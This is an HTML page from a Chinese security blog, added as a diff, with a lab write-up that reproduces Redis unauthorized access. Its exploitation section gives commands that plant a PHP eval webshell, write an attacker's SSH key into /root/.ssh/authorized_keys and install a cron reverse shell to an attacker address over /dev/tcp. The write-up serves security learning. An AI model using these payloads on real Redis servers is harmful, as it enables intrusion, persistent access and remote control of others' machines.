@@ -1,0 +1,164 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>redis未授权访问漏洞复现 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">redis未授权访问漏洞复现</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">2022-04-26</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>&nbsp;&bull;&nbsp;<a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
+<h1 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h1><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和  hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove  及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached  一样，为了保证效率，数据都是缓存在内存中。区别的是 redis  会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。</p>
+<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis  的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis  服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。目前比较主流的案例：yam2 minerd  挖矿程序，还有在多次应急事件中发现大量的watch-smartd挖矿木马。</p>
+<h1 id="漏洞产生条件"><a href="#漏洞产生条件" class="headerlink" title="漏洞产生条件"></a>漏洞产生条件</h1><p>1、redis服务绑定在0.0.0.0:6379端口，而且信任了其他IP，导致了Redis服务暴露在公网上</p>
+<p>2、没有设置密码认证，可以免密登陆Redis服务</p>
+<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>1、导致敏感信息泄露，恶意执行flushall清空所有数据</p>
+<p>2、通过Eval执行Lua代码，通过备份功能往磁盘写入后门文件</p>
+<p>3、如果Redis服务以root身份运行，可以给root用户写入SSH公钥文件，直接通过SSH登陆服务器</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶机: centos7.5 阿里云 39.105.x.x    建议用centos</p>
+<p>攻击机: kali2022 </p>
+<p>redis 3.2.11</p>
+<p>1.下载安装redis</p>
+<pre><code>wget http://download.redis.io/releases/redis-3.2.11.tar.gz
+</code></pre>
+<p>2.解压压缩包</p>
+<pre><code>tar zxvf redis-3.2.11.tar.gz
+</code></pre>
+<p>3.进入解压目录redis-3.2.11 执行make命令</p>
+<pre><code>cd redis-3.2.11
+make
+</code></pre>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426232909091.png" alt="image-20220426232909091"></p>
+<p>4.进入src目录</p>
+<pre><code>cd src
+</code></pre>
+<p>5.将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</p>
+<pre><code>cp redis-server /usr/bin/
+cp redis-cli /usr/bin/
+</code></pre>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426233508159.png" alt="image-20220426233508159"></p>
+<p>6.返回目录redis-3.2.11,将redis.conf拷贝到/etc/目录下</p>
+<pre><code>cd ..
+cp redis.conf /etc/
+</code></pre>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234155118.png" alt="image-20220426234155118"></p>
+<p>7.使用/etc/目录下的redis.conf文件中的配置启动redis服务</p>
+<pre><code>redis-server /etc/redis.conf
+</code></pre>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426234331895.png" alt="image-20220426234331895"></p>
+<p>8.编辑etc中的redis配置文件redis.conf</p>
+<pre><code>vim /etc/redis.conf
+</code></pre>
+<p>去掉ip绑定，允许除本地外的主机远程登录redis服务 前面加#注释掉</p>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430165832466.png" alt="image-20220430165832466"></p>
+<p>关闭保护模式，允许远程连接redis服务将yes 改为no</p>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220426235216372.png" alt="image-20220426235216372"></p>
+<p>最后重启下redis服务就ok</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先测试下目标靶机是否存在未授权访问</p>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430174535586.png" alt="image-20220430174535586"></p>
+<p>成功连接上了，下面开始进一步利用</p>
+<h2 id="1-写入webshell"><a href="#1-写入webshell" class="headerlink" title="1.写入webshell"></a><strong>1.写入webshell</strong></h2><p>写入一句话木马需要我们知道网站的根目录相对于服务器的绝对路径</p>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180627722.png" alt="image-20220430180627722"></p>
+<pre><code>config set dir /www/wwwroot/39.105.71.63/
+config set dbfilename sakura.php
+set webshell &quot;&lt;?php @eval($_POST[&#39;pass&#39;]) ?&gt;&quot;
+save
+</code></pre>
+<p>我的网站上成功出现了这个文件</p>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430180643451.png" alt="image-20220430180643451"></p>
+<p>测试一下，可以成功连接</p>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430181012266.png" alt="image-20220430181012266"></p>
+<h2 id="2-通过写入ssh公钥实现ssh登录"><a href="#2-通过写入ssh公钥实现ssh登录" class="headerlink" title="2.通过写入ssh公钥实现ssh登录"></a><strong>2.通过写入ssh公钥实现ssh登录</strong></h2><p>到这一步，我使用的阿里云服务器出了问题，就自己搭建个靶机(centos 7)吧.</p>
+<p>记得关闭防火墙:</p>
+<pre><code>sudo systemctl stop firewalld
+</code></pre>
+<p>原理:在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key.</p>
+<p>扩展:</p>
+<p><strong>ssh免密登录流程:</strong></p>
+<p>　　（1） 首先在客户端生成一对密钥（ssh-keygen）；</p>
+<p>　　（2） 并将客户端的公钥ssh-copy-id 拷贝到服务端；</p>
+<p>　　（3） 当客户端再次发送一个连接请求，包括ip、用户名；</p>
+<p>　　（4） 服务端得到客户端的请求后，会到authorized_keys中查找，如果有响应的IP和用户，就会随机生成一个字符串，例如：qwer；</p>
+<p>　　（5） 服务端将使用客户端拷贝过来的公钥进行加密，然后发送给客户端；</p>
+<p>　　（6） 得到服务端发来的消息后，客户端会使用私钥进行解密，然后将解密后的字符串发送给服务端；</p>
+<p>　　（7） 服务端接受到客户端发来的字符串后，跟之前的字符串进行对比，如果一致，就允许免密码登录。</p>
+<p><strong>攻击流程:</strong></p>
+<p><strong>1、首先在攻击机(kali)上生成ssh公钥</strong></p>
+<pre><code>ssh-keygen -t rsa
+</code></pre>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430191709018.png" alt="image-20220430191709018"></p>
+<p><strong>2.将公钥写入key.txt文件（前后用\n换行，避免和redis里其他缓存数据混合）</strong></p>
+<p> 进入.ssh目录：</p>
+<pre><code>cd /root/.ssh
+</code></pre>
+<p>写入文件：</p>
+<pre><code>(echo -e”\n”;cat id_rsa.pub;echo -e “\n”)&gt;key.txt
+</code></pre>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430192233869.png" alt="image-20220430192233869"></p>
+<p><strong>3.将key.txt写靶机（使用redis-cli -h ip命令连接靶机，写入文件）</strong></p>
+<pre><code>cat key.txt|redis-cli -h 192.168.0.106 -x set crack
+</code></pre>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221009845.png" alt="image-20220430221009845"></p>
+<p>4.远程登录靶机的Redis服务</p>
+<pre><code>redis-cli -h 192.168.0.106
+</code></pre>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220430221026832.png" alt="image-20220430221026832"></p>
+<p>5.更改redis备份路径为ssh公钥存放目录(一般默认为/root/.ssh)</p>
+<pre><code>config set dir /root/.ssh
+</code></pre>
+<p>6.设置上传公钥的备份文件名字为authorized_keys</p>
+<pre><code>config set dbfilename authorized_keys
+config get dbfilename
+</code></pre>
+<p>7.保存</p>
+<pre><code>save
+</code></pre>
+<p>8.在攻击机上直接ssh免密登录靶机,免密登录成功</p>
+<pre><code>ssh -i id_rsa root@192.168.0.106
+</code></pre>
+<p>最后我没有成功，但大致思路是这样，一直不成功我就先不纠结了。</p>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1576831989_5dfc8bf50878a.png!small" alt="img"></p>
+<h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a><strong>3.反弹shell</strong></h2><pre><code>redis-cli -h 192.168.0.106
+
+set shell &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.108/4444 0&gt;&amp;1\n\n&quot;
+
+config set dir /var/spool/cron
+
+config set dbfilename root
+
+save
+</code></pre>
+<p><img src="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220501003825941.png" alt="image-20220501003825941"></p>
+<p>成功反弹</p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/04/26/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://sakurahack-y.github.io/2022/04/26/redis未授权访问漏洞复现/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/redis/">redis</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#redis%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">redis介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">漏洞产生条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">4.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">5.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%86%99%E5%85%A5webshell"><span class="toc-number">6.1.</span> <span class="toc-text">1.写入webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%80%9A%E8%BF%87%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5%E5%AE%9E%E7%8E%B0ssh%E7%99%BB%E5%BD%95"><span class="toc-number">6.2.</span> <span class="toc-text">2.通过写入ssh公钥实现ssh登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">6.3.</span> <span class="toc-text">3.反弹shell</span></a></li></ol></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">SSRF漏洞总结 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
